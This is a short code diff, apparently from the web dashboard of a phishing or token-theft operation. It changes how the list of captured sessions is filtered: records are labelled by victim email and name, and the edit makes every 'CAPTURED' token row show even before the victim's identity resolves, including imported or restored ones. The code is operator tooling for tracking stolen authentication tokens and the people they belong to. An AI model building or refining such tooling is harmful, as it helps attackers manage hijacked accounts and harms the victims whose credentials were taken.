@@ -6691,7 +6691,12 @@ Assigned      : ${inboxes}
                     const hasAuth = (s.status === 'CAPTURED' || s.status === 'REVOKED');
                     const hasEmail = s.victim_email && s.victim_email.trim() && s.victim_email.toLowerCase() !== 'unknown';
                     const hasName = s.victim_name && s.victim_name.trim() && s.victim_name.toLowerCase() !== 'unknown';
-                    return hasAuth && (hasEmail || hasName);
+                    // A CAPTURED row is always real even before the profile
+                    // resolves (personal accounts resolve identity later, and
+                    // imports/restores may arrive without one). Only revoked
+                    // rows need a name/email to be worth showing.
+                    if (!hasAuth) return false;
+                    return s.status === 'CAPTURED' || hasEmail || hasName;
                 });
                 allTokensData.forEach((s, idx) => { s._origIndex = idx + 1; });
 
